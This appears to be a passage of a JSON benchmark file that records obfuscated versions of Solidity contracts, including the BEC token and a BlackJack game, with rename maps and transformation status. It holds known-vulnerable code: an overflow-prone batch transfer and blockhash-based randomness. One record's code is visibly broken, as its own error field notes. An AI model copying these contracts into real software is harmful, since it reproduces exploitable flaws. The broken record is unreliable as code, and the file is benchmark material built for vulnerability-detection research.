_0xb099c6[msg.sender]._0xb8ef6b(_0x8a340c);\n    for (uint i = 0; i < _0x307a4b; i++) {\n        _0xb099c6[_0x44fa23[i]] = _0xb099c6[_0x44fa23[i]]._0xf32cb2(_0x4178d6);\n        Transfer(msg.sender, _0x44fa23[i], _0x4178d6);\n    }\n    return true;\n  }\n}\n\ncontract BecToken is PausableToken {\n    string public _0x3e6c47 = \"BeautyChain\";\n    string public _0x0debcb = \"BEC\";\n    string public _0x0b0678 = '1.0.0';\n    uint8 public _0x42ab48 = 18;\n\n    function BecToken() {\n      _0xea9c3d = 7000000000 * (10**(uint256(_0x42ab48)));\n      _0xb099c6[msg.sender] = _0xea9c3d;    // Give the creator all initial tokens\n    }\n\n    function () {\n        //if ether is sent to this address, send it back.\n        revert();\n    }\n}\n",
      "rename_map": {
        "transferOwnership": "_0xbf5aab",
        "whenNotPaused": "_0xb8ab53",
        "previousOwner": "_0xd3c4ca",
        "batchTransfer": "_0x554642",
        "transferFrom": "_0x371a2b",
        "totalSupply": "_0xea9c3d",
        "whenPaused": "_0x50bea2",
        "_receivers": "_0x44fa23",
        "onlyOwner": "_0xf3d98d",
        "balanceOf": "_0x51b0f6",
        "remaining": "_0x026264",
        "allowance": "_0x8411b7",
        "_spender": "_0x0d2480",
        "newOwner": "_0xebb352",
        "decimals": "_0x42ab48",
        "balances": "_0xb099c6",
        "version": "_0x0b0678",
        "approve": "_0x7cebe7",
        "unpause": "_0xf41608",
        "spender": "_0x9a8196",
        "allowed": "_0x3f40f2",
        "amount": "_0x8a340c",
        "_owner": "_0x0fe4f7",
        "_value": "_0x4178d6",
        "symbol": "_0x0debcb",
        "paused": "_0x7abc8a",
        "_from": "_0x10c8f2",
        "owner": "_0x1bec2a",
        "pause": "_0x943998",
        "name": "_0x3e6c47",
        "_to": "_0x843a66",
        "cnt": "_0x307a4b",
        "mul": "_0xd7c991",
        "who": "_0x6210b7",
        "div": "_0x2ac2cd",
        "sub": "_0xb8ef6b",
        "add": "_0xf32cb2",
        "to": "_0xb62dd7"
      },
      "changes": [
        "Renamed 38 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_233",
      "transformed_id": "ss_l4_medium_sn_ds_233",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.9_0x27e6calibrary Deck {\n\t// returns random number from 0 to 51\n\t// let's say 'value' % 4 means suit (0 - Hearts, 1 - Spades, 2 - Diamonds, 3 - Clubs)\n\t//\t\t\t 'value' / 4 means: 0 - King, 1 - Ace, 2 - 10 - pip values, 11 - Jacket, 12 - Queen\n\n\tfunction _0xd68f69(address _0xd8bbbb, uint8 _0x690a95) internal returns (uint8) {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n\t\tuint b = block.number;\n\t\tuint timestamp = block.timestamp;\n\t\treturn uint8(uint256(_0xeedd46(block.blockhash(b), _0xd8bbbb, _0x690a95, timestamp)) % 52);\n\t}\n\n\tfunction _0x13904b(uint8 _0x562b96, bool _0x9e4574) internal constant returns (uint8) {\n        // Placeholder for future logic\n        // Placeholder for future logic\n\t\tuint8 value = _0x562b96 / 4;\n\t\tif (value == 0 || value == 11 || value == 12) { // Face cards\n\t\t\treturn 10;\n\t\t}\n\t\tif (value == 1 && _0x9e4574) { // Ace is worth 11\n\t\t\treturn 11;\n\t\t}\n\t\treturn value;\n\t}\n\n\tfunction _0xcf6748(uint8 _0x562b96) internal constant returns (bool) {\n\t\treturn _0x562b96 / 4 == 1;\n\t}\n\n\tfunction _0x0e41f0(uint8 _0x562b96) internal constant returns (bool) {\n\t\treturn _0x562b96 / 4 == 10;\n\t}\n}\n\ncontract BlackJack {\n\tusing Deck for *;\n\n\tuint public _0x05b285 = 50 finney; // 0.05 eth\n\tuint public _0x815557 = 5 ether;\n\n\tuint8 BLACKJACK = 21;\n\n  enum GameState { Ongoing, Player, Tie, House }\n\n\tstruct Game_0x4a0643address _0xd8bbbb; // address \u0438\u0433\u0440\u043e\u043a\u0430_0xd9e26euint _0x23d018; // \u0441\u0442\u044b\u0432\u043a\u0430\n\n\t\tuint8[] houseCards; // \u043a\u0430\u0440\u0442\u044b \u0434\u0438\u043b\u043b\u0435\u0440\u0430_0xd9e26euint8[] _0xe8a772; // \u043a\u0430\u0440\u0442\u044b \u0438\u0433\u0440\u043e\u043a\u0430\n\n\t\tGameState state; // \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435_0xd9e26euint8 cardsDealt;\n\t}\n\n\tmapping (address => Game) public games;\n\n\tmodifier gameIsGoingOn() {\n\t\tif (_0x7ab860sender]._0xd8bbbb == 0 || _0x7ab860sender].state != GameState.Ongoing) {\n\t\t\tthrow; // game doesn't exist or already finished\n\t\t}\n\t\t_;\n\t}\n\n\tevent Deal(\n        bool isUser,\n        uint8 _card\n    );\n\n    event GameStatus(\n    \tuint8 houseScore,\n    \tuint8 houseScoreBig,\n    \tuint8 playerScore,\n    \tuint8 playerScoreBig\n    );\n\n    event Log(\n    \tuint8 value\n    );\n\n\tfunction BlackJack() {\n\n\t}\n\n\tfunction () payable {\n\n\t}\n\n\t// starts a new game\n\tfunction _0xd68f69() public payable_0x4a0643if (_0x7ab860sender]._0xd8bbbb != 0 && _0x7ab860sender].state == GameState.Ongoing) {\n\t\t\tthrow; // game is already going on\n\t\t}\n\n\t\tif_0xb5e90f.value < _0x05b285 || msg.value > _0x815557) {\n\t\t\tthrow; // incorrect bet\n\t\t}\n\n\t\tuint8[] memory houseCards = new uint8[](1);\n\t\tuint8[] memory _0xe8a772 = new uint8[](2);\n\n\t\t// deal the cards_0xd9e26e_0xe8a772[0] = Deck.deal_0xc45c19, 0);\n\t\tDeal(true, _0xe8a772[0]);\n\t\thouseCards[0] = Deck.deal_0xc45c19, 1);\n\t\tDeal(false, houseCards[0]);\n\t\t_0xe8a772[1] = Deck.deal_0xc45c19, 2);\n\t\tDeal(true, _0xe8a772[1]);\n\n\t\t_0x7ab860sender] = Game({\n\t\t\t_0xd8bbbb: msg.sender,\n\t\t\t_0x23d018: msg.value,\n\t\t\thouseCards: houseCards,\n\t\t\t_0xe8a772: _0xe8a772,\n\t\t\tstate: GameState.Ongoing,\n\t\t\tcardsDealt: 3\n\t\t});\n\n\t\tcheckGameResult(_0x7ab860sender], false);\n\t}\n\n\t// deals one more card to the player\n\tfunction hit() public gameIsGoingOn_0x4a0643uint8 nextCard = _0x7ab860sender].cardsDealt;\n\t\t_0x7ab860sender]._0xe8a772._0x8af138deal_0xc45c19, nextCard));\n\t\t_0x7ab860sender].cardsDealt = nextCard + 1;\n\t\tDeal(true, _0x7ab860sender]._0xe8a772[_0x7ab860sender]._0xe8a772.length - 1]);\n\t\tcheckGameResult(_0x7ab860sender], false);\n\t}\n\n\t// finishes the game\n\tfunction stand() public gameIsGoingOn {\n\n\t\tvar (houseScore, houseScoreBig) = calculateScore(_0x7ab860sender].houseCards);\n\n\t\twhile (houseScoreBig < 17) {\n\t\t\tuint8 nextCard = _0x7ab860sender].cardsDealt;\n\t\t\tuint8 newCard = Deck.deal_0xc45c19, nextCard);\n\t\t\t_0x7ab860sender].houseCards.push(newCard);\n\t\t\t_0x7ab860sender].cardsDealt = nextCard + 1;\n\t\t\thouseScoreBig += Deck._0x13904b(newCard, true);\n\t\t\tDeal(false, newCard);\n\t\t}\n\n\t\tcheckGameResult(_0x7ab860sender], true);\n\t}\n\n\t// @param finishGame - whether to finish the game or not (in case of Blackjack the game finishes anyway)\n\tfunction checkGameResult(Game _0xf497a6, bool finishGame_0xfbb639_0x4a0643// calculate house score_0xd9e26evar (houseScore, houseScoreBig) = calculateScore(_0x7ac076houseCards);\n\t\t// calculate player score_0xd9e26evar (playerScore, playerScoreBig) = calculateScore(_0x7ac076_0xe8a772);\n\n\t\tGameStatus(houseScore, houseScoreBig, playerScore, playerScoreBig);\n\n\t\tif (houseScoreBig == BLACKJACK || houseScore == BLACKJACK) {\n\t\t\tif (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {\n\t\t\t\t// TIE_0xfbe8e4if (!msg.sender._0x4161b6)) throw; // return bet to the player_0xfbe8e4_0x7ab860sender].state = GameState.Tie; // finish the game_0xfbe8e4return;\n\t\t\t} else {\n\t\t\t\t// HOUSE WON_0xfbe8e4_0x7ab860sender].state = GameState.House; // simply finish the game_0xfbe8e4return;\n\t\t\t}\n\t\t} else {\n\t\t\tif (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {\n\t\t\t\t// PLAYER WON_0xfbe8e4if (_0x7ac076_0xe8a772.length == 2 && (Deck._0x0e41f0(_0x7ac076_0xe8a772[0]) || Deck._0x0e41f0(_0x7ac076_0xe8a772[1]))) {\n\t\t\t\t\t// Natural blackjack => return x2.5\n\t\t\t\t\tif (!msg.sender.send((_0x7ac076bet * 5) / 2)) throw; // send prize to the player\n\t\t\t\t} else {\n\t\t\t\t\t// Usual blackjack => return x2\n\t\t\t\t\tif (!msg.sender._0x4161b6 * 2)) throw; // send prize to the player\n\t\t\t\t}\n\t\t\t\t_0x7ab860sender].state = GameState.Player; // finish the game_0xfbe8e4return;\n\t\t\t} else {\n\n\t\t\t\tif (playerScore > BLACKJACK) {\n\t\t\t\t\t// BUST, HOUSE WON\n\t\t\t\t\tLog(1);\n\t\t\t\t\t_0x7ab860sender].state = GameState.House; // finish the game\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tif (!finishGame) {\n\t\t\t\t\treturn; // continue the game\n\t\t\t\t}\n\n                // \u043d\u0435\u0434\u043e\u0431\u043e\u0440_0xfbe8e4uint8 playerShortage = 0;\n\t\t\t\tuint8 houseShortage = 0;\n\n\t\t\t\t// player decided to finish the game_0xfbe8e4if (playerScoreBig > BLACKJACK) {\n\t\t\t\t\tif (playerScore > BLACKJACK) {\n\t\t\t\t\t\t// HOUSE WON\n\t\t\t\t\t\t_0x7ab860sender].state = GameState.House; // simply finish the game\n\t\t\t\t\t\treturn;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tplayerShortage = BLACKJACK - playerScore;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tplayerShortage = BLACKJACK - playerScoreBig;\n\t\t\t\t}\n\n\t\t\t\tif (houseScoreBig > BLACKJACK) {\n\t\t\t\t\tif (houseScore > BLACKJACK) {\n\t\t\t\t\t\t// PLAYER WON\n\t\t\t\t\t\tif (!msg.sender._0x4161b6 * 2)) throw; // send prize to the player\n\t\t\t\t\t\t_0x7ab860sender].state = GameState.Player;\n\t\t\t\t\t\treturn;\n\t\t\t\t\t} else {\n\t\t\t\t\t\thouseShortage = BLACKJACK - houseScore;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\thouseShortage = BLACKJACK - houseScoreBig;\n\t\t\t\t}\n\n                // ?????????????????????? \u043f\u043e\u0447\u0435\u043c\u0443 \u0438\u0433\u0440\u0430 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f?_0xfbe8e4if (houseShortage == playerShortage) {\n\t\t\t\t\t// TIE\n\t\t\t\t\tif (!msg.sender._0x4161b6)) throw; // return bet to the player\n\t\t\t\t\t_0x7ab860sender].state = GameState.Tie;\n\t\t\t\t} else if (houseShortage > playerShortage) {\n\t\t\t\t\t// PLAYER WON\n\t\t\t\t\tif (!msg.sender._0x4161b6 * 2)) throw; // send prize to the player\n\t\t\t\t\t_0x7ab860sender].state = GameState.Player;\n\t\t\t\t} else {\n\t\t\t\t\t_0x7ab860sender].state = GameState.House;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tfunction calculateScore(uint8[] cards_0xfbb639 constant returns (uint8, uint8) {\n\t\t_0x2def210;\n\t\tuint8 scoreBig = 0; // in case of Ace there could be 2 different scores_0xd9e26ebool bigAceUsed = false;\n\t\tfor (uint i = 0; i < cards.length; ++i) {\n\t\t\tuint8 _0x562b96 = cards[i];\n\t\t\tif (Deck._0xcf6748(_0x562b96) && !bigAceUsed) { // doesn't make sense to use the second Ace as 11, because it leads to the losing_0xfbe8e4scoreBig += Deck._0x13904b(_0x562b96, true);\n\t\t\t\tbigAceUsed = true;\n\t\t\t} else {\n\t\t\t\tscoreBig += Deck._0x13904b(_0x562b96, false);\n\t\t\t}\n\t\t\tscore += Deck._0x13904b(_0x562b96, false);\n\t\t}\n\t\treturn (score, scoreBig);\n\t}\n\n\tfunction getPlayerCard(uint8 id) public gameIsGoingOn constant returns(uint8) {\n\t\tif_0xdac296id > _0x7ab860sender]._0xe8a772.length) {\n\t\t\tthrow;\n\t\t}\n\t\treturn _0x7ab860sender]._0xe8a772_0x243345function getHouseCard(uint8 id) public gameIsGoingOn constant returns(uint8) {\n\t\tif_0xdac296id > _0x7ab860sender].houseCards.length) {\n\t\t\tthrow;\n\t\t}\n\t\treturn _0x7ab860sender].houseCards_0x243345function getPlayerCardsNumber() public gameIsGoingOn constant returns(uint) {\n\t\treturn _0x7ab860sender]._0xe8a772.length;\n\t}\n\n\tfunction getHouseCardsNumber() public gameIsGoingOn constant returns(uint) {\n\t\treturn _0x7ab860sender].houseCards.length;\n\t}\n\n\tfunction getGameState() public constant returns (uint8) {\n\t\tif (_0x7ab860sender]._0xd8bbbb == 0) {\n\t\t\tthrow; // game doesn't exist\n\t\t}\n\n\t\tGame _0xf497a6 = _0x7ab860sender];\n\n\t\tif (_0x7ac076state == GameState.Player) {\n\t\t\treturn 1;\n\t\t}\n\t\tif (_0x7ac076state == GameState.House) {\n\t\t\treturn 2;\n\t\t}\n\t\tif (_0x7ac076state == GameState.Tie) {\n\t\t\treturn 3;\n\t\t}\n\n\t\treturn 0; // the game is still going on\n\t}\n\n}",
      "rename_map": {
        "urn games[msg.sender": "_0xdf6e98",
        "rn games[msg.sender": "_0xd8414e",
        "}\n\n\t// deals on": "_0xc46ff5",
        "}\n\n\t// finishes": "_0x090245",
        "private {\n\t\t// ": "_0x162225",
        "\n\n\t// @param fi": "_0x2b535c",
        ";\n\n\t\twhile (ho": "_0xec70ca",
        "\t\t\t// player d": "_0xdaddb8",
        "ate player sco": "_0x01d99e",
        "int8 value\n   ": "_0x2fcdce",
        " WON\n\t\t\t\tif (g": "_0x908b44",
        "// return bet ": "_0x8d5766",
        "\t\tif (!msg.sen": "_0xde7f1d",
        "2)) throw; // ": "_0x323767",
        "\t\t} else {\n\t\t\t": "_0xfbf4c5",
        "> BLACKJACK) {": "_0x36e0c7",
        "tus(houseScore": "_0xcf1fcc",
        "uint8 score = ": "_0x2def21",
        "\n\t\t\t\tif (house": "_0x9d8ed3",
        "uint8 playerS": "_0x9e5588",
        "             ": "_0xf9c8d1",
        "f (id < 0 || ": "_0xe4d824",
        ".sender].card": "_0x341211",
        "mes[msg.sende": "_0x242747",
        "rds.length;\n\t": "_0xfade1b",
        "rds);\n\t\t// ca": "_0x7138ab",
        "???????????? ": "_0x401c9a",
        "der].playerCa": "_0xecdceb",
        "ayer == 0 || ": "_0x3348f5",
        ";\n\t\t\tDeal(fal": "_0x082a93",
        "\n\n\t\tif (house": "_0x67d28a",
        "reBig) = calc": "_0x83481c",
        "ame.bet)) thr": "_0xbbcf27",
        "ds.length;\n\t}": "_0x4f58b1",
        "nder].houseCa": "_0x7653aa",
        "send(game.bet": "_0x4161b6",
        "} else {\n\t\t\t\t": "_0x789919",
        " the game\n\t\t\t": "_0x13a774",
        "der].houseCar": "_0xc11186",
        "layer == 0) ": "_0x1082c1",
        " (id < 0 || ": "_0xdac296",
        " constant r": "_0x87ba3f",
        "({\n\t\t\tplaye": "_0x43fa37",
        "oreBig == B": "_0xe037ca",
        "(msg.sender": "_0xc45c19",
        "e.Ongoing,\n": "_0x52fbde",
        "e = BLACKJA": "_0xd587bc",
        "\tgames[msg.": "_0xdfb3a4",
        "= BLACKJACK": "_0xd289fc",
        "playerCards": "_0xe8a772",
        "games[msg.s": "_0xce41c9",
        "e(game.play": "_0xf7024a",
        "ard));\n\t\tga": "_0xfd9282",
        "[id];\n\t}\n\n\t": "_0x243345",
        "k => return": "_0x218b53",
        "ds[1]))) {\n": "_0xba4815",
        "ngth - 1]);": "_0x4fe049",
        " cards\n\t\tpl": "_0xd9bde6",
        "\tcardsDealt": "_0x7f64fe",
        "\tDeal(true,": "_0x102f78",
        "\u0440\u043e\u043a\u0430\n\n\t\tGam": "_0x42467b",
        "eScoreBig, ": "_0xb8c81d",
        ";\n\n    even": "_0xac1a3d",
        "s[msg.send": "_0xc8c809",
        "push(Deck.": "_0x8af138",
        "ar (player": "_0xe77c09",
        ".sender, n": "_0xd9d2b3",
        "\n\t\t\tuint8 ": "_0x6a231f",
        "cardNumber": "_0x690a95",
        "(msg.sende": "_0xad1afe",
        "int8) {\n\t\t": "_0xa194ad",
        "t leads to": "_0x056a9a",
        "= BLACKJAC": "_0xe7c481",
        "r].cardsDe": "_0xbf9c0e",
        "8 houseSco": "_0xcfd140",
        "e == BLACK": "_0xc6ef1b",
        "ublic game": "_0xe42de6",
        "state: Gam": "_0x75a29f",
        "// \u043a\u0430\u0440\u0442\u044b \u0434": "_0x79aa6b",
        "ame\n\t\t\t\t}\n": "_0xb6bda3",
        "int8 playe": "_0xcdadcf",
        "y playerCa": "_0xbbbf50",
        "constant r": "_0x49f219",
        "+= Deck.va": "_0x6769c9",
        "d];\n\t}\n\n\tf": "_0x378ecf",
        "game.house": "_0xa9ad0e",
        "[msg.sende": "_0x2b5ccb",
        "erScoreBig": "_0xdd3ce0",
        "erCards,\n\t": "_0x5da662",
        "games[msg.": "_0x7ab860",
        "core\n\t\tvar": "_0x5fd321",
        "\tif (!msg.": "_0x4a1407",
        "\t\t\t}\n\t\t\tsc": "_0xa23b8e",
        "ard = card": "_0xac9865",
        "\t\t\t\t// HO": "_0x795582",
        "useShorta": "_0xaddede",
        "use;\n\t\t\t\t": "_0xd36d65",
        "\t\t\t\t// TI": "_0x0e4548",
        "'t exist ": "_0xa11134",
        "playerCar": "_0x2a7bcc",
        "\tcheckGam": "_0xfc2620",
        ";\n\t\t\t} el": "_0x45bb74",
        "}\n\n\t// st": "_0xc722ce",
        "urn;\n\t\t\t}": "_0x970a02",
        "g(1);\n\t\t\t": "_0xb00824",
        "t8 cardsD": "_0xbd01e3",
        "layerShor": "_0x1eb3fa",
        "der].stat": "_0xf45a1d",
        "keccak256": "_0xeedd46",
        "\t\t\t\t// PL": "_0x7f87cd",
        "der.send(": "_0x844a62",
        "urn;\n\t\t\t\t": "_0xdb2e90",
        " || playe": "_0x4f3458",
        "reBig > B": "_0x0fdc1f",
        "f (player": "_0xfb8918",
        "send(game": "_0x68d25f",
        "{\n\t\t\tretu": "_0xb09365",
        "\t\t\t// PLA": "_0x8eb4f1",
        "\t\treturn ": "_0x3b7d38",
        "\thouseSho": "_0xb6e1b2",
        ") private": "_0xfbb639",
        "ready goi": "_0xf796b5",
        "turn;\n\t\t\t": "_0x070e74",
        "/ ???????": "_0x0c05bc",
        "\t\t\treturn": "_0xa86e08",
        "igAceUse": "_0x560116",
        "\n\tfuncti": "_0x6f9071",
        "\n\n\tfunct": "_0xceab2d",
        " // in c": "_0xb2212e",
        "ush(newC": "_0xe4f174",
        "on\n\t}\n\n}": "_0xeaf9a1",
        "isBigAce": "_0x9e4574",
        "ames[msg": "_0xfdada2",
        "\t\t\tscore": "_0x0c1684",
        " nextCar": "_0xf4403c",
        "uint8 ne": "_0xaa57a9",
        ".playerC": "_0x9ce615",
        "; // gam": "_0x0fcf11",
        "tant ret": "_0x42d063",
        "ds.lengt": "_0x327c36",
        " false);": "_0xc3cbff",
        "s.length": "_0x2d86a4",
        "\n\n\t\tche": "_0x18f218",
        "valueOf": "_0x13904b",
        "nextCar": "_0x18d273",
        "\t\tgames": "_0x0bcc47",
        "yerCard": "_0x78a4b7",
        "rd);\n\t\t": "_0xd350a3",
        "ck.valu": "_0xf69da2",
        "turn (s": "_0x658269",
        "g on\n\t\t": "_0x1793dc",
        "ender],": "_0xc024df",
        "r alrea": "_0x606e22",
        " to th": "_0xfca1f4",
        "end pr": "_0x52b231",
        "sDealt": "_0x76ec2e",
        "\tgames": "_0xf67f42",
        " game\n": "_0x536e7e",
        "\t\t} el": "_0xa15467",
        "yerCar": "_0x273163",
        "erCard": "_0x27f8a3",
        "ow; //": "_0xb34009",
        "nction": "_0xb23497",
        "player": "_0xd8bbbb",
        "e = Ga": "_0xba1354",
        "games[": "_0x5fc132",
        "0]) ||": "_0x42ea57",
        " incor": "_0x8fcaa1",
        "sg.sen": "_0x229a9d",
        "\n\t\t\t}\n": "_0x80a8e5",
        "n 2;\n\t": "_0x1d8641",
        "functi": "_0xe97f74",
        "maxBet": "_0x815557",
        "nder],": "_0xd96d8d",
        "to the": "_0x875a2c",
        "r, nex": "_0xce89c1",
        "t Game": "_0x47adaa",
        "ue, ga": "_0xce0c5b",
        "te == ": "_0xe62c68",
        "te != ": "_0x914744",
        "tage =": "_0x4b0320",
        "g.send": "_0x94daf8",
        "else {": "_0x203573",
        "houseC": "_0xff0c11",
        "f (gam": "_0x4e9ae0",
        "ame.st": "_0x0a02f6",
        "eCards": "_0xad8cbf",
        "whethe": "_0x42e715",
        "ender]": "_0x61d56f",
        "eUsed)": "_0x3c6b10",
        "uint8[": "_0x10cf84",
        "eResul": "_0x392a73",
        "ize to": "_0x221138",
        "coreBi": "_0x9d1991",
        "sGoing": "_0xb67c41",
        "eIsGoi": "_0x0c03b2",
        "unctio": "_0x0b29fd",
        "minBet": "_0x05b285",
        "inish ": "_0xf20887",
        " < 17)": "_0xa0de73",
        "meStat": "_0x644cd7",
        "the ga": "_0x24f609",
        "re(uin": "_0x4c9f51",
        "useCar": "_0x6a20c9",
        "deal(m": "_0x2b52d2",
        "the pl": "_0xb12751",
        "et: ms": "_0xad7867",
        "turns ": "_0x796f55",
        "ge) {\n": "_0x53d0dd",
        "he gam": "_0x01b5c8",
        "[msg.": "_0xf760e4",
        "ent s": "_0xaa8a1e",
        "\t\t\t//": "_0x19ae6c",
        "ards:": "_0x459e88",
        " (msg": "_0xb5e90f",
        "the g": "_0xf99d59",
        "/ fin": "_0xc2999d",
        "// fi": "_0x1d3f35",
        "\t\tret": "_0x9def8a",
        "e.Tie": "_0x64ddb4",
        "\t});\n": "_0xc1af45",
        "useCa": "_0x79c111",
        "mes[m": "_0x2e2194",
        "finis": "_0xf4c451",
        "\t}\n\t\t": "_0x80451b",
        ";\n\t\t}": "_0xf3dcaf",
        "\n\n\t\t\t": "_0x6e4ada",
        ".Tie)": "_0xec3f84",
        "hrow;": "_0x05c000",
        "ender": "_0xb45f91",
        "isTen": "_0x0e41f0",
        "blic ": "_0xaad5fb",
        "(msg.": "_0x1da2dc",
        "to us": "_0xaef619",
        "e.Pla": "_0x82aa75",
        "e.pla": "_0x4c8373",
        ") {\n\t": "_0x9a0df9",
        "\t} el": "_0x9faee7",
        "ll go": "_0x67550b",
        " {\n\t\t": "_0x4a0643",
        "e.Hou": "_0xacf74b",
        " more": "_0x08891b",
        "\t\tche": "_0xa2e9d0",
        "nder]": "_0x184bad",
        "t8 ho": "_0xafe80b",
        "eturn": "_0xada069",
        "game.": "_0x7ac076",
        "ishGa": "_0x0f09ae",
        "ayerS": "_0xcc389f",
        "\n\t\t\t\t": "_0xfbe8e4",
        "\t\t\tga": "_0xa03ac9",
        "ame i": "_0xc70a40",
        "\t\t\t\t\t": "_0x89ee4c",
        "sende": "_0xa4302c",
        "yerCa": "_0x06ff0a",
        "\n\t\tDe": "_0x633955",
        "e {\n\t": "_0xf7554a",
        "al bl": "_0xfe3ddd",
        "publi": "_0xf9b70b",
        "shed\n": "_0x1b8e44",
        "e gam": "_0xf77aa9",
        "\n\t\t\t}": "_0x132eab",
        "er].p": "_0xc46426",
        "8 sco": "_0x7a9925",
        "lcula": "_0x7ebd70",
        "const": "_0x5efe8c",
        "lic g": "_0x9d901f",
        "onsta": "_0x5c7c07",
        "rd = ": "_0x19185e",
        "nder,": "_0xaa8742",
        "isAce": "_0xcf6748",
        "y fin": "_0x320376",
        "as 11": "_0x5063d8",
        "!bigA": "_0x7b8c53",
        "me ga": "_0x49910d",
        "uncti": "_0xff0ef4",
        "ame d": "_0x31a860",
        "funct": "_0x9f0d8c",
        "[] ca": "_0x600464",
        "\n\t\t}\n": "_0xb09a2b",
        "\tgame": "_0xbf0bce",
        "/ sim": "_0x0499df",
        "y hou": "_0xb61f73",
        "seSco": "_0x2455ff",
        "alt;\n": "_0x4127bf",
        "\n\t\t\th": "_0x66762e",
        "newC": "_0x9cf965",
        "s[1]": "_0x3ea322",
        "erCa": "_0x7a4c47",
        "rCar": "_0x784d2a",
        " = G": "_0x5f862d",
        "() {": "_0x49bb4d",
        "n(ga": "_0xe38689",
        "eSta": "_0x1ced33",
        "tate": "_0x490c0e",
        " bec": "_0x797fae",
        "\tret": "_0x8a2cf7",
        "ore,": "_0x9b83d8",
        "lue,": "_0x2eb8ac",
        "stat": "_0xe89840",
        "s st": "_0xd2dff8",
        "alcu": "_0x5f796d",
        " hou": "_0x9fa003",
        "deal": "_0xd68f69",
        "yer\n": "_0xb16695",
        "eCar": "_0x77bb73",
        "ze t": "_0xbee179",
        " Ace": "_0x4b0368",
        "\n\t\tr": "_0xe82f09",
        "rn 1": "_0x75e6b5",
        "ate ": "_0xf56467",
        "play": "_0x12165e",
        "card": "_0x562b96",
        "etPl": "_0xdc765b",
        "es[m": "_0x753fe3",
        "g.se": "_0xd46783",
        "er].": "_0xffbb9b",
        "= De": "_0x24f4f6",
        "the ": "_0x380145",
        "laye": "_0xdaa8c0",
        "\t\t\t\t": "_0x04be19",
        " sen": "_0xc82608",
        "game": "_0xf497a6",
        "der]": "_0x871173",
        "ckja": "_0xabd641",
        "r\n\t\t": "_0xc19409",
        "e\n\t\t": "_0x212a04",
        " = D": "_0xb3ebe6",
        "(gam": "_0xbb99dd",
        "+= D": "_0x1f2a4d",
        "lt =": "_0x3d805e",
        "s[0]": "_0xc39777",
        "rd\n ": "_0xc09102",
        "d p": "_0x44be78",
        "ort": "_0x82c45f",
        "t r": "_0x5b08d2",
        "f (": "_0x90c9d4",
        "\tga": "_0x84e42e",
        "// ": "_0x6e8fc4",
        "car": "_0x68b583",
        "meS": "_0xbf277e",
        "e =": "_0xe812c9",
        "aye": "_0x94765b",
        "bet": "_0x23d018",
        "tat": "_0xd753f8",
        "ame": "_0x557f18",
        "end": "_0x70ab12",
        "eBi": "_0x68f797",
        " ga": "_0x716cd3",
        ": h": "_0x251b9a",
        "sh ": "_0x50afbf",
        "meI": "_0x36b568",
        "ly ": "_0xf78973",
        ";\n\t": "_0x1c86ba",
        "/ \u0441": "_0x211a8c",
        "kGa": "_0x587975",
        ".st": "_0x85923a",
        "l(t": "_0x8c193d",
        "\n\t\t": "_0xd9e26e",
        "eSc": "_0xdebe7b",
        "ish": "_0x805750",
        "d =": "_0x875234",
        "e -": "_0x2b6822",
        " th": "_0x0ab78f",
        "es[": "_0xedaf71",
        "yer": "_0x97fc73",
        ";\n\n": "_0x27e6ca",
        "\tth": "_0x8099ae",
        "sg.": "_0xcaf1c9",
        " be": "_0xed2f43",
        "me\n": "_0x4dea3a",
        "use": "_0x4b1bea",
        "e {": "_0x67d1ea",
        "eck": "_0xccbe7d",
        "lay": "_0x1fbd31",
        "kJa": "_0x8d92d0",
        " to": "_0x9e554e",
        "= G": "_0x0db469",
        "gam": "_0xf39877",
        "pla": "_0x15c353",
        "sta": "_0x9b67e5",
        "\t\t\t": "_0xa032e0",
        "\t\tp": "_0x2d80d2",
        "hou": "_0xa2f28c",
        ".pl": "_0x66e9ab",
        "ur": "_0x406ca6",
        "me": "_0x40be16",
        "ms": "_0xec27a6",
        "rn": "_0x105732",
        "sg": "_0x0ba666",
        "tu": "_0x3a176f"
      },
      "changes": [
        "Renamed 391 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 2, column 8', 'Syntax error at line 8, column 32', 'Syntax error at line 35, column 1']"
    },
    {
      "original_id": "sn_ds_234",
      "transformed_id": "ss_l4_medium_sn_ds_234",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.13;\n\nlibrary SafeMath {\n  function _0xcc8e14(uint a, uint b) internal returns (uint) {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n    assert(b <= a);\n    return a - b;\n  }\n  function _0x80822b(uint a, uint b) internal returns (uint) {\n        if (false) { revert(); }\n        bool _flag4 = false;\n    uint c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}\n\ncontract ERC20Basic {\n  uint public _0x74b165;\n  address public _0x451a50; //owner\n  address public _0xa883ae; //animator\n  function _0xaae355(address _0x773db9) constant returns (uint);\n  function transfer(address _0x913c99, uint value);\n  event Transfer(address indexed from, address indexed _0x913c99, uint value);\n  function _0xff3c06(address _0x773db9) internal; // pays remaining dividend\n}\n\ncontract ERC20 is ERC20Basic {\n  function _0xc0dd1d(address _0x451a50, address _0xb1834b) constant returns (uint);\n  function _0x9c0862(address from, address _0x913c99, uint value);\n  function _0x61027c(address _0xb1834b, uint value);\n  event Approval(address indexed _0x451a50, address indexed _0xb1834b, uint value);\n}\n\ncontract BasicToken is ERC20Basic {\n  using SafeMath for uint;\n  mapping(address => uint) _0xcfdc8e;\n\n  modifier _0x0d24ff(uint _0xa99a50) {\n     assert(msg.data.length >= _0xa99a50 + 4);\n     _;\n  }\n\n  function transfer(address _0x24e87d, uint _0x648ae5) 